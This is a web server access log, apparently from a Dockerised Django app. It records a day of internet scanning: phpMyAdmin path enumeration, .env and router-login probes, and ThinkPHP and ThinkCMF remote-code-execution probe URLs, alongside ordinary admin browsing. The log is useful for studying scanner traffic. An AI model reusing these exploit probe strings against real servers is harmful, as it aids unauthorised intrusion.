+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:25 +0000] "GET /123131/index.php HTTP/1.1" 404 2480 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /phpMyAdminhf/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:29 +0000] "GET /phpMyAdminhf/index.php HTTP/1.1" 404 2498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /sbb/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:29 +0000] "GET /sbb/index.php HTTP/1.1" 404 2471 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /phpMyAdmln/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:33 +0000] "GET /phpMyAdmln/index.php HTTP/1.1" 404 2492 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /phpMyAdmin_ai/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:33 +0000] "GET /phpMyAdmin_ai/index.php HTTP/1.1" 404 2501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /__phpMyAdmin/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:37 +0000] "GET /__phpMyAdmin/index.php HTTP/1.1" 404 2498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /program/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:37 +0000] "GET /program/index.php HTTP/1.1" 404 2483 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /phppma/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:41 +0000] "GET /phppma/index.php HTTP/1.1" 404 2480 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /phpmy/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:41 +0000] "GET /phpmy/index.php HTTP/1.1" 404 2477 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /mysql/dbadmin/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:45 +0000] "GET /mysql/dbadmin/index.php HTTP/1.1" 404 2501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:53 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php HTTP/1.1" 404 2609 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /sqladmin/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:53 +0000] "GET /sqladmin/index.php HTTP/1.1" 404 2486 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /sql/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:54 +0000] "GET /sql/index.php HTTP/1.1" 404 2471 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /SQL/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:54 +0000] "GET /SQL/index.php HTTP/1.1" 404 2471 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /websql/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:54 +0000] "GET /websql/index.php HTTP/1.1" 404 2480 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /MySQLAdmin/index.php
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:46:55 +0000] "GET /MySQLAdmin/index.php HTTP/1.1" 404 2492 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
+[36mweb_1  |[0m Not Found: /manager/html
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:47:01 +0000] "GET /manager/html HTTP/1.1" 404 2468 "-" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
+[36mweb_1  |[0m Not Found: /axis2/axis2-admin/login
+[36mweb_1  |[0m 114.67.237.246 - - [21/Sep/2020:09:47:01 +0000] "POST /axis2/axis2-admin/login HTTP/1.1" 404 2502 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /cgi-bin/ViewLog.asp
+[36mweb_1  |[0m 116.139.71.50 - - [21/Sep/2020:10:20:02 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 400 59544 "-" "Ankit"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'httpheader.net'. You may need to add 'httpheader.net' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /azenv.php
+[36mweb_1  |[0m 89.248.172.90 - - [21/Sep/2020:10:25:04 +0000] "GET http://httpheader.net/azenv.php HTTP/1.1" 400 58713 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 195.154.60.239 - - [21/Sep/2020:10:34:15 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2505 "http://206.189.68.96:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 195.154.60.239 - - [21/Sep/2020:11:50:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2505 "http://206.189.68.96:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+[36mweb_1  |[0m Not Found: /.env
+[36mweb_1  |[0m 62.4.21.162 - - [21/Sep/2020:12:22:25 +0000] "GET /.env HTTP/1.1" 404 2444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 62.4.21.162 - - [21/Sep/2020:12:22:25 +0000] "POST / HTTP/1.1" 404 2415 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+[36mweb_1  |[0m Not Found: /solr/admin/info/system
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:12:58:58 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2509 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:13:06:41 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:13:16:00 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 2481 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /index.php
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:13:20:34 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2579 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 103.124.12.4 - - [21/Sep/2020:14:19:58 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 198.143.158.178 - - [21/Sep/2020:14:41:14 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[36mweb_1  |[0m Not Found: /api/jsonws/invoke
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:15:10:57 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 2487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /GponForm/diag_Form
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 77.106.117.166 - - [21/Sep/2020:15:38:16 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 176.118.147.19 - - [21/Sep/2020:15:42:07 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 45.148.10.65 - - [21/Sep/2020:15:51:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2505 "http://206.189.68.96:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 94.102.51.119 - - [21/Sep/2020:16:14:58 +0000] "GET / HTTP/1.1" 404 2417 "-" "Linux Gnu (cow)"
+[36mweb_1  |[0m Not Found: /hudson
+[36mweb_1  |[0m 192.241.237.53 - - [21/Sep/2020:16:30:08 +0000] "GET /hudson HTTP/1.1" 404 2450 "-" "Mozilla/5.0 zgrab/0.x"
+[36mweb_1  |[0m Not Found: /config/getuser
+[36mweb_1  |[0m 45.148.10.28 - - [21/Sep/2020:17:21:00 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 2485 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 156.96.112.211 - - [21/Sep/2020:18:17:19 +0000] "GET / HTTP/1.1" 404 2414 "-" "-"
+[36mweb_1  |[0m [2020-09-21 18:38:13 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:12)
+[36mweb_1  |[0m [2020-09-21 18:38:13 +0000] [12] [INFO] Worker exiting (pid: 12)
+[36mweb_1  |[0m [2020-09-21 18:38:13 +0000] [15] [INFO] Booting worker with pid: 15
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 222.138.110.12 - - [21/Sep/2020:19:16:10 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 2525 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 162.142.125.50 - - [21/Sep/2020:19:24:09 +0000] "GET / HTTP/1.1" 404 2417 "-" "-"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 162.142.125.50 - - [21/Sep/2020:19:24:09 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 200.192.151.91 - - [21/Sep/2020:19:25:13 +0000] "GET / HTTP/1.1" 404 2417 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:11 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m Not Found: /favicon.ico
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:12 +0000] "GET /favicon.ico HTTP/1.1" 404 2465 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:16 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:16 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:16 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:16 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:16 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:16 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:18 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:22 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:29 +0000] "POST /api-auth/login/ HTTP/1.1" 200 2943 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:29 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:29 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:29 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:29 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:32 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:34 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /admin HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /admin/ HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2194 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /static/admin/css/login.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /static/admin/css/base.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:38 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:39 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:39 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:40 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
